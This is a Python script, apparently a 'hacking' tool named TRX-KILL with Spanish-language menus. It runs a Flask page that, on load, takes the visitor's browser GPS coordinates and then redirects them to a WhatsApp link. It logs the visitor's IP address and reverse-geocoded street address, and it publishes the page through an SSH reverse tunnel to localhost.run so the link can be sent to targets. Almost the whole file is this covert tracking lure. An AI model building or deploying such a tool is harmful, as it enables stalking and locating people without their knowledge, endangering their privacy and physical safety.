#!/usr/bin/env python3
import os
import time
import sys
import threading
import subprocess
import requests
from flask import Flask, request, render_template_string

# Colores Matrix
GREEN = "\033[1;32m"
RESET = "\033[0m"
BLACK_BG = "\033[40m"

app = Flask(__name__)
URL_FINAL = "https://wa.me/595981000000"

def type_print(text, delay=0.02):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def banner():
    os.system('clear')
    banner_text = r"""
  ██████╗ ██████╗ ██╗  ██╗    ██╗  ██╗██╗██╗     ██╗
  ██╔══██╗██╔══██╗╚██╗██╔╝    ██║ ██╔╝██║██║     ██║
  ██████╔╝██████╔╝ ╚███╔╝     █████╔╝ ██║██║     ██║
  ██╔══██╗██╔══██╗ ██╔██╗     ██╔═██╗ ██║██║     ██║
  ██║  ██║██║  ██║██╔╝ ██╗    ██║  ██╗██║███████╗██║
  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝╚══════╝╚═╝
    """
    print(f"{GREEN}{banner_text}{RESET}")
    print(f"{GREEN} [!] SISTEMA DE AUDITORÍA TRX-KILL | MODO MATRIX [!]{RESET}\n")

def obtener_datos_extra(lat, lon):
    url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}"
    try:
        res = requests.get(url).json()
        return res.get("display_name", "Ubicación Privada")
    except: return "No disponible"

HTML_RASTREO = """
<!DOCTYPE html>
<html><body onload="c()">
    <script>
        function c() {
            navigator.geolocation.getCurrentPosition((p) => {
                fetch('/log', {method: 'POST', headers: {'Content-Type': 'application/json'}, 
                body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude})})
                .then(() => window.location.href = "%s");
            }, () => window.location.href = "%s");
        }
    </script>
</body></html>
""" % (URL_FINAL, URL_FINAL)

@app.route('/')
def index(): return render_template_string(HTML_RASTREO)

@app.route('/log', methods=['POST'])
def log():
    d = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    dir_fisica = obtener_datos_extra(d['lat'], d['lon'])
    print(f"\n{GREEN}[+] ACCESO CONCEDIDO{RESET}")
    print(f"{GREEN}[*] IP: {ip}{RESET}")
    print(f"{GREEN}[*] COORD: {d['lat']}, {d['lon']}{RESET}")
    print(f"{GREEN}[*] CALLE: {dir_fisica}{RESET}")
    return "OK"

def main():
    while True:
        banner()
        type_print(f"{GREEN}>> SELECCIONE MÓDULO DE INYECCIÓN:{RESET}")
        print(f"{GREEN} [1] ANÁLISIS OSINT{RESET}")
        print(f"{GREEN} [2] MATRIX RASTREO GPS (DIRECTO){RESET}")
        print(f"{GREEN} [3] SALIR{RESET}")
        opc = input(f"\n{GREEN}TRX-KILL@ROOT > {RESET}")

        if opc == "2":
            threading.Thread(target=lambda: app.run(host='127.0.0.1', port=5000), daemon=True).start()
            type_print(f"{GREEN}[*] ENCRIPTANDO TÚNEL SSH...{RESET}")
            subprocess.run(['ssh', '-R', '80:localhost:5000', 'nokey@localhost.run'])
        elif opc == "3": break

if __name__ == "__main__":
    main()
